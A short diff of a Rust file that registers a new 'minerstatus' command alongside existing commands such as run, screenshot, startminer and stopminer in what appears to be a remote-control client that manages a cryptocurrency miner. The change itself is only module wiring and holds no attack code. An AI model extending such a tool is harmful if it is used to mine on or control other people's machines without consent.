@@ -2,6 +2,7 @@ mod checkupdates;
 mod devupdate;
 mod disconnect;
 mod help;
+mod minerstatus;
 mod msg;
 mod ping;
 mod reconnect;
@@ -17,7 +18,7 @@ use std::{any::Any, fmt};
 use async_trait::async_trait;
 
 use self::{
-    checkupdates::*, devupdate::*, disconnect::*, help::*, msg::*, ping::*, reconnect::*, run::*,
+    checkupdates::*, devupdate::*, disconnect::*, help::*, minerstatus::*, msg::*, ping::*, reconnect::*, run::*,
     screenshot::*, startminer::*, stat::*, stopminer::*, version::*,
 };
 use crate::client::Client;
@@ -65,6 +66,7 @@ impl CommandsManager {
                 Box::new(Screenshot),
                 Box::new(Startminer),
                 Box::new(Stopminer),
+                Box::new(MinerStatus),
                 Box::new(Disconnect),
                 Box::new(DevUpdate),
                 Box::new(CheckUpdates),
